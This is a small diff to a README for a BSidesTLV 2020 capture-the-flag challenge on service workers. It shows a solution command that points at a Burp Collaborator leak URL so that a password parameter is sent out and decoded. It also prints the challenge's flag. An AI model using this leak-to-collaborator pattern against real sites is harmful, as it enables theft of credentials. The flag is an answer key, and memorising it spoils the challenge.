@@ -39,7 +39,7 @@ The challenge components are:
    python solution.py -l {LEAK_URL}
    ```
    * LEAK_URL - Burp Collaborator / RequestBin / Other URL
-   * Example: python solution.py -l https://r6yhg580xmz4aawm50mqprae95fw3l.burpcollaborator.net/
+   * Example: `python solution.py -l https://r6yhg580xmz4aawm50mqprae95fw3l.burpcollaborator.net/`
 4) Decode the argument from the query parameter password and you have the flag: **BSidesTLV2020{S3rv1ce_W0rk3rs@Y0urS3rvic3}**
 
 ### Challenge Solution Explanation
